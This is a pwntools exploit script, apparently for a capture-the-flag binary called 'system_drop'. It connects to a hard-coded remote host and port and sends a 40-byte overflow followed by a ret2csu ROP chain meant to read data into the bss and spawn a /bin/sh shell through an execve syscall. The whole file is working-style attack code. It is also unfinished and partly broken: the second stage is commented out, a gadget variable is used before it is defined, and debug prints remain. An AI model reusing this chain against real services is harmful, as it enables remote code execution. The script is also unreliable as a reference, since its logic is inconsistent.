#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./system_drop')
context.terminal = ["tilix","-a","session-add-right","-e"]
context.arch = exe.arch
host = args.HOST or '138.68.141.182'
port = int(args.PORT or 32210)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x00000000004005B0
continue
'''.format(**locals())

# -- Exploit goes here --
def ret2csu(what, rdi, rsi, rdx):
    # rop = ROP(exe.path)
    pop_all = next(exe.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15')))
    try:
        mov_rdx_r14 = next(exe.search(asm('mov rdx, r14')))
        payload = flat([
    
            pop_all,
            0x0,
            0x1,
            rdi,
            rsi,
            rdx,
            what,
            mov_rdx_r15,
            p64(0x0)*7
    
])
    except StopIteration:
        mov_rdx_r15 = next(exe.search(asm('mov rdx, r15')))
        payload = flat([
    
            pop_all,
            0x0,
            0x1,
            what,
            rdi,
            rsi,
            rdx,
            mov_rdx_r15,
            p64(0x0)*7
    
])
    return payload

def gen_ret2csu(callwhat, rdi, rsi, rdx, callnext):
    rop = flat([

        pop_all,
        0x0,
        0x1,
        callwhat,
        rdi,
        rsi,
        rdx,
        mov_rdx,
        p64(0x0)*7,
        callnext
])
    return rop

io = start()
mov_rdx_r15 = next(exe.search(asm('mov rdx, r15')))
print("sad")
rop  = ROP("./system_drop")
# rop({'rbx':0x0, 'rbp':0x1, 'r12': 0x0, 'r13': 0x0,  'r14':0x0, 'r15': 0x0})
lmao = next(exe.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15')))
print(hex(lmao))
pop_all = 0x00000000004005CA
mov_rdx = 0x00000000004005B0
pop_r12_r13_r14_r15 = 0x00000000004005CC
syscall = 0x0000000040053b
bss = 0x6011c0
payload = b"A"*40
payload += ret2csu(exe.got['read'], 0x0, bss, 0x3b) # write /bin/sh and syscall gadget to bss. and also set rax 0x3b
payload += p64(0xdeadbeef)
# payload += p64(bss) # null out rdx rsi and set r12 to pointer of syscall gadget in bss and rdi to binsh pointer and do syscall execve
# payload += p64(bss + 8)
# payload += p64(0x0)
# payload += p64(0x0)
# payload += p64(mov_rdx)
io.send(payload)
# print("[+] stage one sent")
# lmao = p64(syscall) + b"/bin/sh\x00"
# pause()
# io.send(lmao.ljust(0x3b, b'\x00'))
io.interactive()